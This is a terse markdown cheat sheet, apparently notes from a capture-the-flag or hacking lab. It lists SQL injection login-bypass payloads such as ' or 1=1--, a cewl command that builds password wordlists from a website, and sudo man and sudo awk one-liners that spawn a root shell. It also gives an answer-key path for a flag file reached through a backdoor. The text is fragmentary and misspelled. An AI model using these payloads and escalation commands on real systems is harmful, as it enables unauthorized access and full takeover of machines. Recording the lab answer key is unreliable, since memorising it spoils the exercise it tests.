### FTP Burteforce:
pass wordlist in the windows system. After the login FTP server

#### SECRET file

“SECRET.txt” using a backdoor that was installed in the server. Enter the secret number hidden in the file. 
Ans: Path: C:\Users\Administrator\Documents\Findme

### SQL payloads
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—
```
### Making custom wordlist from website keywords:
   $ cewl example.com -m 5 -w words.txt
   
   m= pass lenght
   w= output file
   
### Root privilege Escln
  ```
  $ sudo man man
  $ !/bin/bash
  $ sudo awk 'BEGIN {system("/bin/bash")}'
```
